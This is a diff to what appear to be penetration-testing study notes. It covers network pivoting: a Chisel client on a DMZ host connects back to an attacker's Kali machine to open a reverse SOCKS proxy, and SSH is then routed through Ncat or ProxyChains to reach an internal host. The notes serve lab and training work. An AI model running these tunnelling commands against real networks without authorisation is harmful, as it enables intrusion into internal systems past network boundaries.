@@ -3716,10 +3716,11 @@ The first time plink connects to a host, it will attempt to cache the host key i
 5. On `DMZ01`, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
 6. Now, you should be able to see inbound Chisel traffic and an incoming connection in the Chisel server
 7. Check if the SOCKS port has been opened by the `KALI01` Chisel server with `ss -ntplu`
-8. Finally, pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at `127.0.0.1:1080` to connect to `INTERNAL01`
-   - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
-   - `%h` and `%p` tokens represent the SSH command host and port values
-
+8. How to use the HTTP Tunnel
+   - SSH with Ncat: Pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at `127.0.0.1:1080` to connect to `INTERNAL01`
+     - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
+     - `%h` and `%p` tokens represent the SSH command host and port values
+   - Another option is to use ProxyChains by adding `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` and prepending `sudo proxychains` to each command we want to run
 
 
 ### <ins>Linux Privilege Escalation</ins>
